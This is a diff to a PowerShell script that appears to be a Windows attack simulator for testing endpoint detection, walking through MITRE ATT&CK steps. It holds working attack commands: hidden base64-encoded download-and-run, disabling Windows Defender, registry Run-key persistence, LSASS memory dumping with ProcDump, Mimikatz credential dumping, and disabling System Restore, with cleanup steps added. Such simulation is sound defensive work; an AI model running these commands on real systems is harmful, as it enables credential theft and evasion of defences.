@@ -1,13 +1,15 @@
+# This is a test script used to mimic an attack. 
+# The only real malware employed is mimikatz and it will only be used to extra passwords, those passwords will not be saved or sent anywhere.
+
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Warning "[Error] You do not have Administrator rights to run this script!`nPlease re-run as an Administrator!"
     Start-Sleep 10
     return
 }
 
-Install-Module base64 -Scope CurrentUser 
-Install-Module powershell-yaml -Scope CurrentUser
 Write-Host "Starting Datto Attack Simulator"
-New-Item -Path 'C:\' -Name "AttackSim" -ItemType "directory" -ea 0
+New-Item -Path "$env:TEMP" -Name "AttackSim" -ItemType "directory" -ea 0
+$attackDir = "$env:TEMP\AttackSim"
 
 
 Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No malware is used."
@@ -19,23 +21,24 @@ Write-Host "Starting Execution Step"
 Write-Host "Initiating a T1059.001 - Powershell Download Harness"
 Write-Host "(Execution-T1059.001) Detected use of hidden powershell base64 encoded commands"
 Write-Host "[ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)"
-Powershell.exe -NoP -command "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', \`"$env:TEMP\bad.exe\`"); Write-Host T1059.001 - Powershell Download Harness; Start-Sleep 3"
+$cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Write-Host T1059.001 - Powershell Download Harness; Start-Sleep 3"
+Powershell.exe -NoP -command $cmd
 
 
 Write-Host "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
-$Cmd = '(new-object System.Net.WebClient).DownloadFile("https://live.sysinternals.com/psexec.exe", "$env:TEMP\bad.exe")'
+$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe')"
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
 )
 powershell.exe -win H -NoP -e $EncodedCommand
 
 Write-Host "Initiating T1059.001 - Powershell Execution From Alternate Data Stream"
 powershell.exe -Win N -exec bypass -nop -command { 
-    Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
-    iex (Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
+    Add-Content -Path $attackDir\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
+    iex (Get-Content -Path $attackDir\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
     Start-Sleep 3
 }
 Start-Sleep 3
-Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
+Remove-Item $attackDir\NTFS_ADS.txt -Force -ErrorAction Ignore
 
 Start-Sleep 5
 
@@ -46,20 +49,22 @@ Write-Host -ForegroundColor Cyan "`n`nStarting discovery step"
 Write-Host "Initiating Discovery - T1082 - System Information Discovery"
 Write-Host "When an adversary first gains access to a system, they often gather detailed information about the compromised system and network including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions like a ransom.`n"
 Powershell.exe -Win N -exec bypass -nop -command { 
-    Hostname > recon.txt
-    whoami >> recon.txt 
-    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> recon.txt
-    Systeminfo >> recon.txt
-    gpresult /z >> recon.txt
-    "NTFS: $((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains 'NTFS')" >> recon.txt
-    reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 >> recon.txt
-    net localgroup administrators 2>&1 >> recon.txt 
-    net group "domain admins" /domain 2>&1 >> recon.txt 
-    net group "Exchange Trusted Subsystem" /domain 2>&1 >> recon.txt  
+    $attackDir = "$env:TEMP\AttackSim"
+    Hostname > $attackDir\recon.txt
+    whoami >> $attackDir\recon.txt 
+    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> $attackDir\recon.txt
+    Systeminfo >> $attackDir\recon.txt
+    gpresult /z >> $attackDir\recon.txt
+    "NTFS: $((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains 'NTFS')" >> $attackDir\recon.txt
+    reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 >> $attackDir\recon.txt
+    net localgroup administrators 2>&1 >> $attackDir\recon.txt 
+    net group "domain admins" /domain 2>&1 >> $attackDir\recon.txt 
+    net group "Exchange Trusted Subsystem" /domain 2>&1 >> $attackDir\recon.txt  
     Start-Sleep 3
 }
 Start-Sleep 3
-Remove-item recon.txt -ea 0 -force
+Remove-item $attackDir\recon.txt -ea 0 -force
+
 
 Start-Sleep 10
 
@@ -72,15 +77,11 @@ powershell.exe -Win N -exec bypass -nop -command 'Set-MpPreference -DisableRealt
 sc config WinDefend start= disabled
 sc stop WinDefend
 
-Write-Host "Stopping Cylance..."
-Powershell.exe -Win N -exec bypass -nop -command ‘Get-Service CylanceSvc | Stop-Service; Start-Sleep 3’
-#Powershell.exe -command ‘Get-Service CylanceSvc | Start-Service’
-
 
 Write-Host "Creating binary with double extension"
-Copy-Item -Path C:\Windows\System32\cmd.exe -Destination "C:\AttackSim\AttackSim.pdf.exe"
+Copy-Item -Path C:\Windows\System32\calc.exe -Destination "$attackDir\AttackSim.pdf.exe"
 Write-Host "Initiating double-extension binary execution"
-Start-Process -FilePath "C:\AttackSim\AttackSim.pdf.exe"
+Start-Process -FilePath "$attackDir\AttackSim.pdf.exe"
 Start-Sleep 2
 Stop-Process -Name AttackSim*
 
@@ -88,7 +89,7 @@ Stop-Process -Name AttackSim*
 Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information"
 Write-Host "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.`n"
 Write-Host "Certutil Download and Decode"
-certutil -urlcache -split -f http://imthebadguy.com/a test.txt
+certutil -urlcache -split -f http://www.brainjar.com/java/host/test.html test.txt
 certutil -decode -f test.txt WindowsUpdate.exe
 Start-Sleep 10
 Remove-Item test.txt -Force -ea 0
@@ -101,8 +102,8 @@ Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"
 Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
 Write-Host "Adding T1547.001 - Registry Run Key Foothold"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe"
-#Start-Sleep 2
-#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
+Start-Sleep 2
+REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f >nul 2>&1
 
 
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
@@ -151,9 +152,9 @@ Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
 # CREDENTIAL
 Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
 Write-Host "Downloading ProcDump.exe"
-Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile 'C:\AttackSim\procdump.exe' -Force
+Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe"
 Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
-Start-Process -FilePath 'C:\AttackSim\Procdump.exe' -ArgumentList "-ma lsass.exe lsass.dmp -accepteula" 2>$null -Wait
+Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula" 2>$null -Wait
 
 Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
 
@@ -182,6 +183,8 @@ Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
 Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /add
 Start-Sleep 3
+
+#Cleanup
 Write-Host "Removing Guest from Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /delete
 
@@ -195,7 +198,10 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableC
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
+Start-Sleep 2
 
+# clean up
+Write-Host "Restoring Automatic Windows recovery features"
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
@@ -217,3 +223,10 @@ powershell -Win N -exec bypass -nop -command {
     RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
     Start-Sleep 3
 }
+
+Write-Host "Restarting Defender..."
+sc config WinDefend start= Auto
+sc start WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+Remove-Item -Path $attackDir -Recurse -force -ea 0
